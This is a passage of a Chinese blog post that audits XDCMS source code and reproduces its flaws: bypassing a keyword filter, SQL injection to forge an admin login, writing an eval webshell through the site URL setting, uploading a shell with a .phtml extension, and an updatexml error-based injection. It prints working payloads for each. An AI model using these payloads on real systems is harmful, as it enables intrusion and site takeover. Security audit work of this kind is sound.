+<p>我们输入的参数都经过了<code>safe_html</code>函数，我们来看看这个函数具体的效果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_html</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="variable">$str</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个就显得很鸡肋了，我们可以双写绕过，也可以大小写绕过。这里有个小细节，注意空格，比如 这里是匹配 空格update空格，直接一个<code>updata</code>它是匹配不到的，因为昨天发现在把union也双写的时候发现不行，直接union是可以的。</p>
+<p>所以这里的参数我们都可控，我们在回过来看看这个验证机制。<code>$sql=&quot;select * from &quot;.DB_PRE.&quot;admin where </code>username<code>=&#39;$username&#39;&quot;;</code> 这个地方是存在sql注入的，然后我们只要保证 <code>$password=password($password,$rs[&#39;encrypt&#39;])</code>  就可以绕过验证登陆，我们可以采用联合查询来造成回显的表结果可控，也就是数据是可控的。</p>
+<p>所以我们接下来重点放在<code> password()</code> 这个函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">password</span>(<span class="params"><span class="variable">$password</span>, <span class="variable">$encrypt</span>=<span class="string">&#x27;&#x27;</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$pwd</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$pwd</span>[<span class="string">&#x27;encrypt&#x27;</span>] =  <span class="variable">$encrypt</span> ? <span class="variable">$encrypt</span> : <span class="title function_ invoke__">get_random</span>();</span><br><span class="line">	<span class="variable">$password_md5</span>=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$password</span>));</span><br><span class="line">	<span class="variable">$nums</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$password_md5</span>) - <span class="title function_ invoke__">strlen</span>(<span class="variable">$pwd</span>[<span class="string">&#x27;encrypt&#x27;</span>]);</span><br><span class="line">	<span class="variable">$pwd</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr_replace</span>(<span class="variable">$password_md5</span>,<span class="variable">$pwd</span>[<span class="string">&#x27;encrypt&#x27;</span>],<span class="variable">$nums</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$encrypt</span> ? <span class="variable">$pwd</span>[<span class="string">&#x27;password&#x27;</span>] : <span class="variable">$pwd</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的 <code>$encrypt</code> 值也是可控的，所以我们可以利用这个算法先生成一个密码，然后构造符合它的密码。</p>
+<p><img src="https://i.loli.net/2021/05/03/4BLVcbvZwf9OldS.png" alt="56.png"></p>
+<p>这里构造的是<code>123456</code> ， <code>encrypt</code> 为1 </p>
+<p>我们尝试一下：</p>
+<p><img src="https://i.loli.net/2021/05/03/rolNS8IVPBM7JDv.png" alt="123456.png"></p>
+<p>发现成功登陆后台</p>
+<h3 id="后台写shell"><a href="#后台写shell" class="headerlink" title="后台写shell"></a>后台写shell</h3><p>后台的系统设置 -&gt; 网站配置 -&gt; 基本信息这里：</p>
+<p><img src="https://i.loli.net/2021/05/03/s9Qay8veLHdgn3N.png" alt="789.png"></p>
+<p>我们来看看相对于的源代码：<code>/modules/xdcms/setting.php</code> 的 <code>save()</code> 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cms</span>=SYS_PATH.<span class="string">&#x27;xdcms.inc.php&#x27;</span>;   <span class="comment">//生成xdcms配置文件</span></span><br><span class="line"><span class="variable">$cmsurl</span>=<span class="string">&quot;&lt;?php\n define(&#x27;CMS_URL&#x27;,&#x27;&quot;</span>.<span class="variable">$info</span>[<span class="string">&#x27;siteurl&#x27;</span>].<span class="string">&quot;&#x27;);\n define(&#x27;TP_FOLDER&#x27;,&#x27;&quot;</span>.<span class="variable">$info</span>[<span class="string">&#x27;template&#x27;</span>].<span class="string">&quot;&#x27;);\n define(&#x27;TP_CACHE&#x27;,&quot;</span>.<span class="variable">$info</span>[<span class="string">&#x27;caching&#x27;</span>].<span class="string">&quot;);\n?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">creat_inc</span>(<span class="variable">$cms</span>,<span class="variable">$cmsurl</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里的 <code>siteurl</code> 我们是可控的，而<code>create_inc</code> 的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">creat_inc</span>(<span class="params"><span class="variable">$fl</span>,<span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$fl</span>))&#123;@<span class="title function_ invoke__">unlink</span>(<span class="variable">$fl</span>);&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$fl</span>,<span class="string">&#x27;w&#x27;</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">C</span>(<span class="string">&quot;file_open_error&quot;</span>),<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_EX);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">C</span>(<span class="string">&quot;file_write_error&quot;</span>),<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_UN);</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会把 <code>$cmsurl</code>的内容写到  <code>xdcms.inc.php</code> 里面，所以我们可以写shell 。</p>
+<p><code>siteurl=http://127.0.0.1&#39;);eval($_POST[0]);//</code></p>
+<p>这里很特殊，这里限制了<code>siteurl</code> 必须以 &#x2F; 结尾，而这里我们又得用到注释符号，这两者完全契合了。</p>
+<p><img src="https://i.loli.net/2021/05/03/HTDdl5cKMkBVSiq.png" alt="111.png"></p>
+<p>可以发现shell被直接写进去了。</p>
+<h3 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h3><p>我们可以在文件上传配置那里改允许的后缀格式：</p>
+<p><img src="https://i.loli.net/2021/05/03/Gt4xJnAjOQ3ciVY.png" alt="a.png"></p>
+<p>这里一般反应是会直接给添上php，然后我们去找到网站的上传点，logo那里：</p>
+<p><img src="https://i.loli.net/2021/05/03/zyMAsfQGP5Wqrwl.png" alt="b.png"></p>
+<p>抓个包看一下：</p>
+<p><img src="https://i.loli.net/2021/05/03/kBfvt3lUDHbo2Yq.png" alt="c.png"></p>
+<p>可以看到后台处理的函数是<code>system/function/upload.inc.php</code>  我们跟进一下：</p>
+<p>看一下关键的部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;../libs/upload.class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;../../cache/cache_sys/cache_set_upload.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$goback</span> = <span class="string">&quot; &lt;a href=javascript:history.back(-1)&gt;返 回&lt;/a&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>(<span class="variable">$size</span>,<span class="variable">$folder</span>);</span><br><span class="line">    <span class="variable">$upload</span>-&gt;allowed_file_ext = <span class="variable">$allowed</span>;</span><br><span class="line">	<span class="variable">$upload</span>-&gt;watermark=<span class="variable">$watermark</span>;</span><br><span class="line">	<span class="variable">$upload</span>-&gt;watermark_pos=<span class="variable">$pos</span>;</span><br><span class="line">	<span class="variable">$upload</span>-&gt;watermark_font=<span class="variable">$font</span>;</span><br><span class="line">	<span class="variable">$upload</span>-&gt;watermark_color=<span class="variable">$color</span>;</span><br><span class="line">	<span class="variable">$upload</span>-&gt;watermark_text=<span class="variable">$text</span>;</span><br><span class="line">	<span class="variable">$upload</span>-&gt;watermark_image=<span class="variable">$image</span>;</span><br><span class="line">	<span class="variable">$upload</span>-&gt;watermark_width=<span class="variable">$width</span>;</span><br><span class="line">	<span class="variable">$upload</span>-&gt;upload_type=<span class="variable">$type</span>;</span><br><span class="line">    <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">upload_process</span>();</span><br></pre></td></tr></table></figure>
+
+<p>这里一开始包含了两个文件，一个是upload类文件，另外一个是默认的配置文件。</p>
+<p><code>cache/cache_sys/cache_set_upload.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_upload</span>=<span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;isopen&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;imagesize&#x27;</span> =&gt; <span class="string">&#x27;500&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;imageallowed&#x27;</span> =&gt; <span class="string">&#x27;gif,jpg,jpeg,png&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;filesize&#x27;</span> =&gt; <span class="string">&#x27;2048&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;fileallowed&#x27;</span> =&gt; <span class="string">&#x27;rar,zip,doc&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;watermark&#x27;</span> =&gt; <span class="string">&#x27;100&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;pos&#x27;</span> =&gt; <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;font&#x27;</span> =&gt; <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;width&#x27;</span> =&gt; <span class="string">&#x27;300&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;color&#x27;</span> =&gt; <span class="string">&#x27;#FF0000&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;text&#x27;</span> =&gt; <span class="string">&#x27;xdcms.cn&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;image&#x27;</span> =&gt; <span class="string">&#x27;uploadfile/xdcms.png&#x27;</span>,</span><br><span class="line">);</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+
+<p>然后就是<code>libs/upload.class.php</code>  定义了一个上传类，基本逻辑就是把默认的一些参数赋值给这个上传类的属性，然后我们可以看到上传类的一个安全函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="variable language_">$this</span>-&gt;make_script_safe )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>( <span class="string">&quot;/\.(cgi|pl|js|asp|php|html|htm|jsp|jar)(\.|$)/i&quot;</span>, <span class="variable">$FILE_NAME</span> ) )</span><br><span class="line">&#123;</span><br><span class="line">					<span class="variable">$FILE_TYPE</span>                 = <span class="string">&#x27;text/plain&#x27;</span>;</span><br><span class="line">					<span class="variable language_">$this</span>-&gt;file_extension      = <span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">					<span class="variable language_">$this</span>-&gt;parsed_file_name	   = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&quot;/\.(cgi|pl|js|asp|php|html|htm|jsp|jar)(\.|$)/i&quot;</span>, <span class="string">&quot;<span class="subst">$2</span>&quot;</span>, <span class="variable">$this</span>-&gt;parsed_file_name );</span><br><span class="line">					<span class="variable">$renamed</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+
+<p>可以看到php这里的黑名单了，但是phtml并没有被禁用，所以回到之前那个地方，我们可以改成phtml来传shell.</p>
+<h3 id="注册框报错注入"><a href="#注册框报错注入" class="headerlink" title="注册框报错注入"></a>注册框报错注入</h3><p>在会员注册那里存在着报错，可以随便测试一下：</p>
+<p><img src="https://i.loli.net/2021/05/03/cSyQiLlbV98M4oA.png" alt="445.png"></p>
+<p>我在username那里用了单引号，注册一下会发现报错：</p>
+<p><img src="https://i.loli.net/2021/05/03/bxdeatyJImRBoGY.png" alt="446.png"></p>
+<p>我们在来看看对应后台的语句：</p>
+<p><code>$user_num=$this-&gt;mysql-&gt;num_rows(&quot;select * from &quot;.DB_PRE.&quot;member where </code>username<code>=&#39;$username&#39;&quot;);//判断会员是否存在</code>  </p>
+<p>这里的username参数可控，然后安全防护函数还是可以用双写和大小写绕过。我们测试一下报错注入：</p>
+<p><code>username=myangs&#39; or updatexml(1,concat(0x7e,(Select database()),0x7e),1)#</code> </p>
+<p><img src="https://i.loli.net/2021/05/03/PtLC6saWMfx19Uz.png" alt="444.png"></p>
+<p>发现成功！接下来都是一把梭了。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>复现过程中，发现问题其实和平常大多数CTF的差不多，只是CTF考察单一环境，这里的环境比较综合。另外黑盒白盒相互结合着审挺重要的，通过抓包去找到处理文件的路径，方便我们来结合白盒。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/04/11/CTF%E4%B8%ADpython%E9%97%AE%E9%A2%98%E4%B9%8Bpin%E7%A0%81/" rel="prev" title="CTF中python问题之pin码">
+                  <i class="fa fa-angle-left"></i> CTF中python问题之pin码
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/05/04/bluecms/" rel="next" title="bluecms">
+                  bluecms <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
